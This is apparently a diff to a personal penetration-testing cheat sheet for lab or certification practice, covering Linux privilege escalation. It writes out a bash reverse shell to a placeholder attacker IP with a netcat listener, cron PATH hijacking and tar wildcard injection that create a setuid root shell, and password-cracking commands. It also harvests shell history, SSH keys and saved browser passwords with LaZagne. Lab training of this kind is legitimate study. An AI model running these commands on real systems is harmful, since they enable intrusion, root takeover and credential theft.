@@ -1,4 +1,4 @@
-# Troubleshooting : 
+# <span style="color:rgb(11, 142, 224)">General : </span>
 
 MTU:
 if terminals get stuck : 
@@ -9,6 +9,11 @@ sudo ip link set dev tun0 mtu 1000
 Also, ensure that you are using Google's DNS servers in your Kali by running these commands:  
 `sudo chattr -i /etc/resolv.conf` `sudo bash -c "" echo nameserver 8.8.8.8 > /etc/resolv.conf"" && sudo bash -c "" echo nameserver 8.8.4.4 >> /etc/resolv.conf""`
 
+Password cracking 
+john will automatically identify the hashing algorithm
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
 # <span style="color:rgb(11, 142, 224)">Enumeration </span>
 
 not always will the machine allow ping 
@@ -183,35 +188,128 @@ chisel.exe client <KALI_IP>:8000 R:<SOCKS_PORT>:socks
 
 # <span style="color:rgb(11, 142, 224)">Linux Privilege Escalation</span>
 
-to see which all i can run as root 
+Find Flag 
+```
+find / -name "local.txt" 2>/dev/null
+find / -name "proof.txt" 2>/dev/null
+```
+
+programs "user" allowed to run via sudo
 ```
 sudo -l 
 ```
 
 SUID : 
 command : 
-
+```
+find / -user root -perm /4000 2>/dev/null
 ```
 
+Cron tabs 
+Weak File Permissions : 
+minute ; hour ; day of month ; month ; day of week
+```
+1. View System-wide crontab: cat /etc/crontab
+2. check if path is writeable
+3. locate <filename>
+```
+replace content of file with : 
+```
+#!/bin/bash
+<put bash reverse shell>
+# bash -i >& /dev/tcp/<kali ip>/4444 0>&1
+```
+and start listener on kali
+```
+nc -nvlp 4444
 ```
 
-cron tabs 
-
+PATH Manipulation : 
+View the contents of the system-wide crontab:  
 ```
-ps aux
+cat /etc/crontab
+```
+Note that the PATH variable starts with **/home/user** which is our user's home directory.
+Create a file called **overwrite.sh** in your home directory with the following contents:
+```
+#!/bin/bash  
+cp /bin/bash /tmp/rootbash  
+chmod +xs /tmp/rootbash
+```
+Make sure that the file is executable:
+```
+chmod +x /home/user/overwrite.sh
+```
+Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
+```
+/tmp/rootbash -p
+```
+or 
+change the path ! 
+```
+export PATH=/tmp:$PATH
+# export PATH=<directory which you want to add to path>:$PATH
+# echo $PATH
+```
+
+Wild Cards :
+cat the cron job file 
+if it has `tar czf /tmp/backup.tar.gz *`
+check gtfo bin if it has `-- option name` available or not
+then in the path it takes , create these files : 
+Create a script that will run as root:
+```
+cat > shell.sh <<'EOF'
+#!/bin/sh
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+EOF
+```
+Make it executable:
+```
+chmod +x shell.sh
+```
+Now create the malicious filenames:
+```
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+```
+Check them:
+```
+ls -la
+```
+After it cron executes (ex. after every minute) , check:
+```
+ls -l /tmp/rootbash
+```
+Then:
+```
+/tmp/rootbash -p
 ```
 
 
+read bash (commands and password entered) history : 
 ```
-pspy
+cat ~/.*history
+# .zsh_history ; python history ; mysql history
 ```
+ssh keys : 
+```
+cd /home/kali/.ssh
+/root/.ssh
 
-how to use pspy ? 
-
-Find Flag 
+#if you get it : chmod 600 id_rsa
 ```
-find / -name "local.txt" 2>/dev/null
-find / -name "proof.txt" 2>/dev/null
+browser saved passwords : 
+```
+git clone https://github.com/alessandroz/lazagne
+```
+password files readable/writeable : 
+```
+ls -la /etc/passwd
+ls -la /etc/shadow
+
+openssl passwd -6 password123 #create a new passowrd hash ; $6$ is sha512
 ```
 
 # <span style="color:rgb(11, 142, 224)">Windows Privilege Escalation</span>
